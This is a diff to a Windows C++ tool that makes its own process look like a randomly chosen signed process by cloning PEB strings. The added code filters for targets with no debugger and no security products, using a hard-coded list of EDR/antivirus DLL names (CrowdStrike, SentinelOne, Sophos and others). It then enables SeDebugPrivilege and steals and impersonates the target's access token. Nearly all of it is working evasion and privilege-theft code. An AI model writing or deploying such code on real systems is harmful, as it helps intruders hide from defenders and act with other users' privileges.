@@ -224,6 +224,93 @@ static std::wstring GetProcessImagePath(DWORD pid)
     return std::wstring(buf, len);
 }
 
+// ─────────────────────────────────────────────────────────────────────────────
+// Filtering helpers for PickRandomSignedProcess
+// ─────────────────────────────────────────────────────────────────────────────
+
+// Returns true if the process runs in Session 0 (system/kernel services).
+static bool IsSessionZeroProcess(DWORD pid)
+{
+    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
+    if (!hProc) return true; // can't open → assume system, skip
+
+    DWORD sessionId = 0;
+    bool result = !ProcessIdToSessionId(pid, &sessionId) || sessionId == 0;
+    CloseHandle(hProc);
+    return result;
+}
+
+// Returns true if a debugger is attached to the process.
+static bool IsBeingDebugged(DWORD pid)
+{
+    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
+    if (!hProc) return true; // can't query → treat as monitored
+
+    BOOL debugged = FALSE;
+    CheckRemoteDebuggerPresent(hProc, &debugged);
+    CloseHandle(hProc);
+    return debugged == TRUE;
+}
+
+// Returns true if the process has known EDR/AV DLLs loaded in its module list.
+static bool HasMonitoringDlls(DWORD pid)
+{
+    static const wchar_t* kSuspectLibs[] = {
+        L"csfalcon",     // CrowdStrike
+        L"SentinelOne",
+        L"mbae",         // Malwarebytes
+        L"aswhook",      // Avast
+        L"snxhk",        // Avast
+        L"hmpalert",     // HitmanPro.Alert
+        L"cylance",
+        L"CarbonBlack",
+        L"cbhook",
+        L"mfehook",      // McAfee
+        L"sophos",
+    };
+
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
+    if (snap == INVALID_HANDLE_VALUE) return false;
+
+    MODULEENTRY32W me = { sizeof(me) };
+    bool found = false;
+
+    if (Module32FirstW(snap, &me))
+    {
+        do {
+            for (const auto* lib : kSuspectLibs)
+            {
+                if (wcsstr(me.szModule, lib) || wcsstr(me.szExePath, lib))
+                {
+                    found = true;
+                    break;
+                }
+            }
+        } while (!found && Module32NextW(snap, &me));
+    }
+
+    CloseHandle(snap);
+    return found;
+}
+
+// Returns the thread count for a given PID from a process snapshot.
+static DWORD GetThreadCount(DWORD pid)
+{
+    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (snap == INVALID_HANDLE_VALUE) return 0;
+
+    PROCESSENTRY32W pe = { sizeof(pe) };
+    DWORD count = 0;
+
+    if (Process32FirstW(snap, &pe))
+        do {
+            if (pe.th32ProcessID == pid) { count = pe.cntThreads; break; }
+        } while (Process32NextW(snap, &pe));
+
+    CloseHandle(snap);
+    return count;
+}
+
 // Helper for PickRandomSignedProcess – must be at file scope so it can be
 // used as a std::vector<> template argument (local types are not allowed).
 struct ProcessSnapshotEntry { DWORD pid; wchar_t exeName[MAX_PATH]; };
@@ -264,29 +351,201 @@ static SignedProcessInfo PickRandomSignedProcess(DWORD maxAttempts = 48)
     std::mt19937 rng(std::random_device{}());
     std::shuffle(entries.begin(), entries.end(), rng);
 
-    // ── 3. Verify one-by-one; stop at first signed hit or after maxAttempts ──
+    // ── 3. Filter one-by-one; stop at first signed+unmonitored hit ──────────
     DWORD attempts = 0;
     for (const auto& e : entries)
     {
         if (attempts++ >= maxAttempts) break;
 
+        // Skip PID 0 (Idle) and PID 4 (System)
+        if (e.pid <= 4) continue;
+
+        // Skip Session 0 processes (system services, kernel workers)
+        if (IsSessionZeroProcess(e.pid)) continue;
+
+        // Skip processes under a debugger
+        if (IsBeingDebugged(e.pid)) continue;
+
+        // Skip thread-heavy processes (likely bloated security tools)
+        if (GetThreadCount(e.pid) > 80) continue;
+
+        // Resolve full image path — required for signature check
         std::wstring path = GetProcessImagePath(e.pid);
         if (path.empty()) continue;
 
-        if (VerifyFileSignature(path) == ERROR_SUCCESS)
-        {
-            SignedProcessInfo result;
-            result.pid       = e.pid;
-            result.exeName   = e.exeName;
-            result.imagePath = path;
-            printf("[+] Selected signed process: PID %-6lu %ws\n",
-                   result.pid, result.exeName.c_str());
-            return result;
-        }
+        // Must be Authenticode-signed
+        if (VerifyFileSignature(path) != ERROR_SUCCESS) continue;
+
+        // Must not have EDR/AV DLLs loaded in its module list
+        if (HasMonitoringDlls(e.pid)) continue;
+
+        // ✓ Signed + unmonitored
+        SignedProcessInfo result;
+        result.pid       = e.pid;
+        result.exeName   = e.exeName;
+        result.imagePath = path;
+        printf("[+] Selected signed + unmonitored process: PID %-6lu %ws\n",
+               result.pid, result.exeName.c_str());
+        return result;
     }
 
     printf("[-] No signed process found within %lu attempts.\n", maxAttempts);
     return {}; // pid == 0 signals failure
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// Token stealing — duplicate the primary token of a remote process and
+// impersonate it (or assign it) on the current process/thread.
+// ─────────────────────────────────────────────────────────────────────────────
+
+// Enable SeDebugPrivilege on the current process token so we can open
+// processes we don't own.  Call once at startup before any OpenProcess.
+static bool EnableSeDebugPrivilege()
+{
+    HANDLE hToken = NULL;
+    if (!OpenProcessToken(GetCurrentProcess(),
+                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+    {
+        printf("[-] OpenProcessToken (self) failed: %lu\n", GetLastError());
+        return false;
+    }
+
+    LUID luid = {};
+    if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid))
+    {
+        printf("[-] LookupPrivilegeValue(SeDebugPrivilege) failed: %lu\n",
+               GetLastError());
+        CloseHandle(hToken);
+        return false;
+    }
+
+    TOKEN_PRIVILEGES tp        = {};
+    tp.PrivilegeCount          = 1;
+    tp.Privileges[0].Luid      = luid;
+    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+
+    BOOL ok = AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);
+    DWORD err = GetLastError();
+    CloseHandle(hToken);
+
+    if (!ok || err == ERROR_NOT_ALL_ASSIGNED)
+    {
+        printf("[-] AdjustTokenPrivileges failed: %lu\n", err);
+        return false;
+    }
+
+    printf("[+] SeDebugPrivilege enabled.\n");
+    return true;
+}
+
+// Duplicate the primary token from `sourcePid` and impersonate it on the
+// current thread.  Optionally assigns it to the process token instead
+// (requires SeAssignPrimaryTokenPrivilege — usually needs SYSTEM).
+//
+//   impersonateOnly = true  →  ImpersonateLoggedOnUser  (thread-level, easier)
+//   impersonateOnly = false →  SetThreadToken + attempt process-token swap
+//
+// Returns the duplicated token handle on success (caller must CloseHandle),
+// or NULL on failure.
+static HANDLE StealProcessToken(DWORD sourcePid, bool impersonateOnly = true)
+{
+    // ── 1. Open the source process ───────────────────────────────────────────
+    HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, sourcePid);
+    if (!hProc)
+    {
+        printf("[-] StealProcessToken: OpenProcess(%lu) failed: %lu\n",
+               sourcePid, GetLastError());
+        return NULL;
+    }
+
+    // ── 2. Open its primary token ────────────────────────────────────────────
+    HANDLE hSrcToken = NULL;
+    if (!OpenProcessToken(hProc, TOKEN_DUPLICATE | TOKEN_QUERY, &hSrcToken))
+    {
+        printf("[-] OpenProcessToken(%lu) failed: %lu\n",
+               sourcePid, GetLastError());
+        CloseHandle(hProc);
+        return NULL;
+    }
+    CloseHandle(hProc);
+
+    // ── 3. Print token user for diagnostic purposes ──────────────────────────
+    DWORD needed = 0;
+    GetTokenInformation(hSrcToken, TokenUser, NULL, 0, &needed);
+    if (needed)
+    {
+        std::vector<BYTE> buf(needed);
+        if (GetTokenInformation(hSrcToken, TokenUser, buf.data(), needed, &needed))
+        {
+            auto* tu = reinterpret_cast<TOKEN_USER*>(buf.data());
+            wchar_t name[256] = {}, domain[256] = {};
+            DWORD nLen = 256, dLen = 256;
+            SID_NAME_USE use;
+            if (LookupAccountSidW(NULL, tu->User.Sid, name, &nLen, domain, &dLen, &use))
+                printf("[*] Source token user: %ws\\%ws\n", domain, name);
+        }
+    }
+
+    // ── 4. Duplicate as an impersonation token ───────────────────────────────
+    HANDLE hDup = NULL;
+    if (!DuplicateTokenEx(hSrcToken,
+                          TOKEN_ALL_ACCESS,
+                          NULL,
+                          SecurityImpersonation,
+                          TokenImpersonation,
+                          &hDup))
+    {
+        printf("[-] DuplicateTokenEx failed: %lu\n", GetLastError());
+        CloseHandle(hSrcToken);
+        return NULL;
+    }
+    CloseHandle(hSrcToken);
+
+    // ── 5. Impersonate on the current thread ─────────────────────────────────
+    if (!ImpersonateLoggedOnUser(hDup))
+    {
+        printf("[-] ImpersonateLoggedOnUser failed: %lu\n", GetLastError());
+        CloseHandle(hDup);
+        return NULL;
+    }
+
+    printf("[+] Token stolen from PID %lu — thread is now impersonating.\n",
+           sourcePid);
+
+    // ── 6. Optionally try to swap the process primary token ─────────────────
+    //      This requires SeAssignPrimaryTokenPrivilege (typically SYSTEM only).
+    if (!impersonateOnly)
+    {
+        HANDLE hPrimary = NULL;
+        if (DuplicateTokenEx(hDup,
+                             TOKEN_ALL_ACCESS,
+                             NULL,
+                             SecurityImpersonation,
+                             TokenPrimary,
+                             &hPrimary))
+        {
+            // Re-open our own process token for replacement
+            HANDLE hSelf = NULL;
+            if (OpenProcessToken(GetCurrentProcess(),
+                                 TOKEN_ASSIGN_PRIMARY | TOKEN_ADJUST_DEFAULT |
+                                 TOKEN_ADJUST_SESSIONID | TOKEN_QUERY,
+                                 &hSelf))
+            {
+                // SetTokenInformation can swap the primary token on Vista+
+                if (SetTokenInformation(hSelf, TokenLinkedToken,
+                                        &hPrimary, sizeof(HANDLE)))
+                    printf("[+] Process primary token replaced.\n");
+                else
+                    printf("[~] SetTokenInformation (primary swap) failed: %lu"
+                           " — thread impersonation is still active.\n",
+                           GetLastError());
+                CloseHandle(hSelf);
+            }
+            CloseHandle(hPrimary);
+        }
+    }
+
+    return hDup; // caller owns this handle
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
@@ -334,7 +593,9 @@ static void ApplyUnicodeString(UNICODE_STRING* us, const std::wstring& value)
 // Step 5 — apply cloned strings to our own process
 // ─────────────────────────────────────────────────────────────────────────────
 
-static void ApplyToCurrentProcess(const ProcessStrings& src)
+// sourcePid — the PID we selected (used for token theft).
+// Pass 0 to skip token theft (PEB-only clone).
+static void ApplyToCurrentProcess(const ProcessStrings& src, DWORD sourcePid = 0)
 {
     PEB* peb = NtCurrentTeb()->ProcessEnvironmentBlock;
     RTL_USER_PROCESS_PARAMETERS* params = peb->ProcessParameters;
@@ -363,5 +624,27 @@ static void ApplyToCurrentProcess(const ProcessStrings& src)
         SetConsoleTitleW(slash ? slash + 1 : src.imagePathName.c_str());
     }
 
-    printf("\n[+] Done. This process now looks like the target in Task Manager.\n");
+    printf("\n[+] PEB clone done. This process now looks like the target in Task Manager.\n");
+
+    // ── Token theft ──────────────────────────────────────────────────────────
+    if (sourcePid != 0)
+    {
+        printf("\n[*] Attempting token theft from PID %lu...\n", sourcePid);
+
+        // SeDebugPrivilege is required to open most processes.
+        EnableSeDebugPrivilege();
+
+        HANDLE hToken = StealProcessToken(sourcePid, /*impersonateOnly=*/true);
+        if (hToken)
+        {
+            // hToken stays open — closing it would revert impersonation.
+            // Store it globally or keep it alive for the process lifetime.
+            // To revert at any point: RevertToSelf(); CloseHandle(hToken);
+            printf("[+] Token impersonation active. Current thread runs as target user.\n");
+        }
+        else
+        {
+            printf("[-] Token theft failed — continuing with original token.\n");
+        }
+    }
 }
